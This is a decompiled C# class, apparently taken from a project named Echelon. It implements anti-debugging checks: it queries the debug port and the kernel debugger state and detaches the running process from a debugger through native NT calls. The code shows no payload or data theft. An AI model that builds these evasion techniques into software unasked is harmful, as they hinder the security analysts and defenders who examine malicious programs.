using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Echelon.Global.Other;
using Echelon.Global.Other.WinStructs;

namespace Echelon.Global.Protect
{
	// Token: 0x0200004A RID: 74
	internal class DebugProtect2
	{
		// Token: 0x060001BC RID: 444 RVA: 0x0000CEA0 File Offset: 0x0000B0A0
		public static int PerformChecks()
		{
			if (DebugProtect2.CheckDebugPort() == 1)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Задействован порт дебаггера: HIT");
				return 1;
			}
			if (DebugProtect2.CheckKernelDebugInformation())
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Обнарурежена информация ядра дебаггера: HIT");
				return 1;
			}
			if (DebugProtect2.DetachFromDebuggerProcess())
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Отделение от процесса дебаггера: HIT");
				return 1;
			}
			return 0;
		}

		// Token: 0x060001BD RID: 445 RVA: 0x0000CF0C File Offset: 0x0000B10C
		private static int CheckDebugPort()
		{
			IntPtr intPtr = new IntPtr(0);
			int num;
			if (NativeMethods.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugPort, out intPtr, Marshal.SizeOf(intPtr), out num) == NtStatus.Success && intPtr == new IntPtr(-1))
			{
				Console.WriteLine("DebugPort : {0:X}", intPtr);
				return 1;
			}
			return 0;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x0000CF70 File Offset: 0x0000B170
		private unsafe static bool DetachFromDebuggerProcess()
		{
			IntPtr invalid_HANDLE_VALUE = DebugProtect2.INVALID_HANDLE_VALUE;
			uint num = 0u;
			int num2;
			int num3;
			return NativeMethods.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugObjectHandle, out invalid_HANDLE_VALUE, IntPtr.Size, out num2) == NtStatus.Success && NativeMethods.NtSetInformationDebugObject(invalid_HANDLE_VALUE, DebugObjectInformationClass.DebugObjectFlags, new IntPtr((void*)(&num)), Marshal.SizeOf(num), out num3) == NtStatus.Success && NativeMethods.NtRemoveProcessDebug(Process.GetCurrentProcess().Handle, invalid_HANDLE_VALUE) == NtStatus.Success && NativeMethods.NtClose(invalid_HANDLE_VALUE) == NtStatus.Success;
		}

		// Token: 0x060001BF RID: 447 RVA: 0x0000CFF4 File Offset: 0x0000B1F4
		private unsafe static bool CheckKernelDebugInformation()
		{
			SYSTEM_KERNEL_DEBUGGER_INFORMATION system_KERNEL_DEBUGGER_INFORMATION;
			int num;
			return NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemKernelDebuggerInformation, new IntPtr((void*)(&system_KERNEL_DEBUGGER_INFORMATION)), Marshal.SizeOf(system_KERNEL_DEBUGGER_INFORMATION), out num) == NtStatus.Success && system_KERNEL_DEBUGGER_INFORMATION.KernelDebuggerEnabled && !system_KERNEL_DEBUGGER_INFORMATION.KernelDebuggerNotPresent;
		}

		// Token: 0x0400009F RID: 159
		private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
	}
}
